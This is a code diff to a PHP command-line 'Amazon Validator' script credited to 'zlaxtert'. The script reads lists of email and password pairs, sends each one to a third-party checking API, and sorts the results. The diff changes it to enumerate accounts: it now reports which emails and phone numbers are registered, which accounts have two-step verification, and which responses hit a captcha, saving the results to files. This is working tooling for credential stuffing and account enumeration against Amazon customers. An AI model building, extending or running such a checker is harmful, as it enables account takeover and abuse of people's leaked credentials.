@@ -4,6 +4,9 @@
  * CODE BY ZLAXTERT
  * AMAZON VALIDATOR V3.1.0
  * APIs FROM BANDITCODING
+ * TELE : @zlaxtert22
+ * IG : @zlaxtert
+ * GITHUB : zlaxtert
  * ========================
 */
 
@@ -15,8 +18,8 @@ $date = date("l, d-m-Y (H:m:s)");
 
 //========> REQUIRE
 
-require_once "xnxx/gangbang.php";
-require_once "xnxx/threesome.php";
+require_once "function/gangbang.php";
+require_once "function/threesome.php";
 
 //========> BANNER
 
@@ -60,7 +63,7 @@ $rollingCurl = new \RollingCurl\RollingCurl();
 
 foreach($lists as $list){
     //API
-    $api = "http://api.apeboard.pw/amazon/api.php?submit=1&list=".$list."&apikey=BNDT-2803654-FREE";
+    $api = "http://api.apeboard.pw/amazon/test.php?submit=1&type=validator&list=".$list."&apikey=BNDT-2803654-FREE";
     // EXPLODE
     if(strpos($list, "|") !== false) list($email, $pass) = explode("|", $list);
 	else if(strpos($list, ":") !== false) list($email, $pass) = explode(":", $list);
@@ -85,26 +88,48 @@ $rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\R
     $js = json_decode($x, TRUE);
     $msg = $js['data']['msg'];
     echo " [\e[31;1m".$no."\e[0m/\e[32;1m".$total."\e[0m]\e[0m";
-    if(strpos($x, '"code":"200"')){
-        $l++;
-        save_file("result/live.txt","[+] LIVE | $list | [$msg] | BY ./ZLAXTERT");
-        echo "\e[32;1m LIVE\e[0m |\e[34;1m $list \e[0m| ";
-    }elseif(strpos($x, '"code":"404"')){
+    if(strpos($x, '"info":"Registered e-mail! [Wrong Password]"')){
+        $v++;
+        save_file("result/live.txt","[+] VALID PHONE | $list | [$msg] | BY ./ZLAXTERT");
+        echo "\e[33;1m VALID EMAIL\e[0m |\e[34;1m $list \e[0m| ";
+    }elseif(strpos($x, '"info":"Registered number! [SEND OTP]"')){
+        $v++;
+        save_file("result/live.txt","[+] VALID NUMBER | $list | [$msg] | BY ./ZLAXTERT");
+        echo "\e[33;1m VALID NUMBER\e[0m |\e[34;1m $list \e[0m| ";
+    }elseif(strpos($x, '"info":"Registered EMAIL! [(2SV) Verification!]"')){
+        $v++;
+        save_file("result/live.txt","[+] VALID EMAIL | $list | [$msg] | BY ./ZLAXTERT");
+        echo "\e[33;1m VALID EMAIL\e[0m |\e[34;1m $list \e[0m| ";
+    }elseif(strpos($x, '"info":"Registered PHONE NUMBER! [(2SV) Verification!]"')){
+        $v++;
+        save_file("result/live.txt","[+] VALID NUMBER | $list | [$msg] | BY ./ZLAXTERT");
+        echo "\e[33;1m VALID NUMBER\e[0m |\e[34;1m $list \e[0m| ";
+    }elseif(strpos($x, '"info":"EMAIL is not registered!"')){
         $d++;
-        save_file("result/die.txt","$list");
+        save_file("result/die.txt","\n$list");
+        echo "\e[31;1m DIE \e[0m|\e[34;1m $list \e[0m| ";
+    }elseif(strpos($x, '"info":"PHONE NUMBER is not registered!"')){
+        $d++;
+        save_file("result/die.txt","\n$list");
         echo "\e[31;1m DIE \e[0m|\e[34;1m $list \e[0m| ";
     }elseif(strpos($x, "Request Timeout")){
         $t++;
-        save_file("result/tryagain.txt","$list");
+        save_file("result/tryagain.txt","\n$list");
         echo "\e[36;1m TIMEOUT \e[0m| ";
+    }elseif(strpos($x, '"info":"RECAPTCHA!"')){
+        $t++;
+        save_file("result/tryagain.txt","\n$list");
+        echo "\e[37;1m RECAPTCHA! \e[0m|\e[31;1m $list \e[0m| ";
     }elseif(strpos($x, "The server is temporarily busy, try again later!")){
         $t++;
-        save_file("result/tryagain.txt","$list");
+        save_file("result/tryagain.txt","\n$list");
         echo "\e[36;1m SERVER BUSSY \e[0m| ";
+    }elseif(strpos($x, '"msg":"Invalid API key."')){
+        exit("\e[31;1m INVALID API KEY \e[0m| ");
     }else{
         $u++;
         save_file("result/unknonwn.txt","$x");
-        echo "\e[33;1m UNKNOWN \e[0m|\e[34;1m $list \e[0m| ";
+        echo "\e[34;1m UNKNOWN \e[0m|\e[33;1m $list \e[0m| ";
     }
     echo "\e[33;1mBY \e[36;1m./ZLAXTERT \e[37;1mV.3.1.0\e[0m";
     echo PHP_EOL;
@@ -114,12 +139,12 @@ $rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\R
 
 echo PHP_EOL;
 echo "================[DONE]================".PHP_EOL;
-echo " DATE      : ".$date.PHP_EOL;
-echo " LIVE      : ".$l.PHP_EOL;
-echo " DIE       : ".$d.PHP_EOL;
-echo " TRYAGAIN  : ".$t.PHP_EOL;
-echo " UNKNOWN   : ".$u.PHP_EOL;
-echo " TOTAL     : ".$total.PHP_EOL;
+echo " DATE          : ".$date.PHP_EOL;
+echo " LIVE          : ".$v.PHP_EOL;
+echo " DIE           : ".$d.PHP_EOL;
+echo " TRYAGAIN      : ".$t.PHP_EOL;
+echo " UNKNOWN       : ".$u.PHP_EOL;
+echo " TOTAL         : ".$total.PHP_EOL;
 echo "======================================".PHP_EOL;
 echo "File saved in folder 'result' ".PHP_EOL;
 
@@ -146,17 +171,22 @@ function curl($url) {
 }
 function banner(){
     $banner = "    
-\e[32;1mVERSION 3.1.0\e[0m                                            
-\e[34;1m           _____ _____ _____ _____ _____ _____                 
-\e[34;1m          |  _  |     |  _  |__   |     |   | |                
-\e[34;1m          |     | | | |     |   __|  |  | | | |                
-\e[34;1m          |__|__|_|_|_|__|__|_____|_____|_|___|                                                                                                                              
-\e[31;1m   _____ _____ __    _____ ____  _____ _____ _____ _____ 
-\e[31;1m  |  |  |  _  |  |  |     |    \|  _  |_   _|     | __  |
-\e[31;1m  |  |  |     |  |__|-   -|  |  |     | | | |  |  |    -|
-\e[31;1m   \___/|__|__|_____|_____|____/|__|__| |_| |_____|__|__|
-                                                 \e[33;1mZLAXTERT
-\e[37;1m _________________________________________________________\e[0m
+
+\e[32;1mVERSION 3.1.0\e[0m  
+\e[31;1m       ______      \e[37;1m     _____________________________________________
+\e[31;1m    .-'      '-.   \e[37;1m    |                                             |
+\e[31;1m   /            \  \e[37;1m    | \e[34;1m      ___   __  ______ ____  ____  _  __ \e[37;1m   |
+\e[31;1m  |              | \e[37;1m    | \e[34;1m     / _ | /  |/  / _ /_  / / __ \/ |/ / \e[37;1m   |
+\e[31;1m  |,  .-.  .-.  ,| \e[37;1m    | \e[34;1m    / __ |/ /|_/ / __ |/ /_/ /_/ /    /  \e[37;1m   |
+\e[31;1m  | )(__/  \__)( | \e[37;1m    | \e[34;1m   /_/_|_/_/ _/_/_/_|_/___/\____/_/|_/   \e[37;1m   |
+\e[31;1m  |/     /\     \| \e[37;1m    | \e[31;1m    / ___/ // / __/ ___/ //_/ __/ _ \    \e[37;1m   |
+\e[31;1m  (_     ^^     _) \e[37;1m    | \e[31;1m   / /__/ _  / _// /__/ ,< / _// , _/    \e[37;1m   |
+\e[31;1m   \__|IIIIII|__/  \e[37;1m    | \e[31;1m   \___/_//_/___/\___/_/|_/___/_/|_|     \e[37;1m   |
+\e[31;1m    | \IIIIII/ |   \e[37;1m    | \e[37;1m                                         \e[37;1m   |
+\e[31;1m    \          /   \e[37;1m    | \e[33;1m              AUTHOR ZLAXTERT            \e[37;1m   |
+\e[31;1m     `--------`    \e[37;1m    |_____________________________________________|\e[0m
+
+\e[37;1m====================================================================== \e[0m
 ";
     return $banner;
 }
